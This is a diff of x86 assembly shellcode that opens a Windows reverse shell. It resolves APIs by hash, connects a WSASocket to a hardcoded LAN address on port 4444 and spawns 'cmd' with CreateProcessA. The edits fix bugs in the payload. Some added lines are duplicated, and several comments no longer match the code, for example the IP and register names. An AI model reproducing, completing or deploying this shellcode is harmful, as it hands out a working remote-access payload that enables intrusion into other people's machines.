@@ -119,14 +119,13 @@ get_next_mod1:
 	jmp short next_mod		
 start:
 	pop ebp					; save address of api_call in ebp
-
 ; get functions in ws2_32.dll
 ;ws2_32.dll		77 73 32 5f 33 32 2e 64 6c 6c
 	xor eax,eax
 	push 0xff206c6c			; push ws2_32.dll to stack
 	push 0x642e3233
 	push 0x5f327377
-	add [esp+0xA],al		; put null byte at end of string
+	mov [esp+0xA],al		; put null byte at end of string
 	push esp				; push null terminated string
 	push 0xec0e4e8e			; push loadlibraryA hash
 	call ebp				; call loadLibraryA(ws2_32.dll)
@@ -145,7 +144,7 @@ start:
 	add esp,0x0300			; restore stack to original position
 ;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
 ;WSASocket(2,1,0,0,0,0)
-		xor eax,eax		; zero out eax
+	xor eax,eax		; zero out eax
 	push eax		; dwflags = 0
 	push eax		; g = 0
 	push eax		; lpprotocolinfo = NULL
@@ -157,24 +156,35 @@ start:
 	push 0xADF509D9	; push WSASocketA hash
 	call ebp		; call WSASocket
 	mov esi,eax		; save socket file discriptor in esi
+; put "cmd" on stack
+	mov eax,0x646d6301	; mov "cmd01" to eax
+	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
+	push eax		; push cmd on stack
+	mov ebx,esp	; save pointer to cmd in ebp+0x20	
 ;Connect(socket s,struct sockaddr *name, namelen)
 ;Connect(esi,struct *sockaddr_in,lenght)
 ;initalize struct sockaddr_in
 ;sockaddr_in{sin_family,sin_port,struct in addr sin_addr,sin_zero}
 	xor eax,eax		; zeor out eax
 	push eax		; sin_zero = NULL
-	push 0x8098A8C0 	; push address in network bytes format for struct in_addr (192.168.152.128)
+	push 0x807FA8C0 	; push address in network bytes format for struct in_addr (192.168.152.128)
 	mov eax,0x5c110102	; put the port in networkbytes format in eax 4444 = 5c11 the extra 0102 will be decresed to become 0002 the sinfamily since the size is word of sin-family and sin_port
 	dec ah			;decresed the 0102 as explained above
 	push eax		; push the sin_port and sin_family
-	mov ebx,esp		; put the pointer to struct on stack to ebx
+	mov eax,esp		; put the pointer to struct on stack to ebx
 ;struct end
-	mov al,0x10		; let eax = 0x10 which 16 decimal - size of struct 
-	push eax		; push value of namelen 0x10
-	push ebx		; push struct sockaddr_in
+	xor ebx,ebx
+	mov bl,0x10		; let eax = 0x10 which 16 decimal - size of struct 
+	push ebx		; push value of namelen 0x10
+	push eax		; push struct sockaddr_in
 	push esi		; push socke file descriptor returned by WSASocketA
 	push 0x60AAF9EC	; push connect() hash
 	call ebp		; call connect()
+; put "cmd" on stack
+	mov eax,0x646d6301	; mov "cmd01" to eax
+	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
+	push eax		; push cmd on stack
+	mov ebx,esp	; save pointer to cmd in ebp+0x20
 ;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
 ;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
 ;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
@@ -182,7 +192,7 @@ start:
 	xor ecx,ecx	
 	mov cl,0x54		; ecx holds the size of both struct STARTUPINFO & PROCESSINFO
 	sub esp,ecx		; save sace on stack for structs
-	mov esi,esp		; edi holds pointer to struct
+	mov edi,esp		; edi holds pointer to struct
 	push edi		; save pointer on stack
 	xor eax,eax		
 	rep stosb		; fill bytes in edi with bytes at eax till ecx = 0 ( fill out out structs with 00
@@ -213,10 +223,10 @@ start:
 	dec eax			; eax = 0
 	push eax		; set lpthreadAttributes argument as NULL
 	push eax 		; set lpProcessAttributes argument as NULL
-	push DWORD [ebp+0x2c]		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
+	push ebx		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
 	push eax		; set lpApplicationName argument to NULL
 	push 0x16B3FE72		; push createProcessA hash
-	call ebp
+	call ebp 
 ;exitprocess	0x7ED8E273
 ;	push 0x73E2D87E
 ;	call ebp
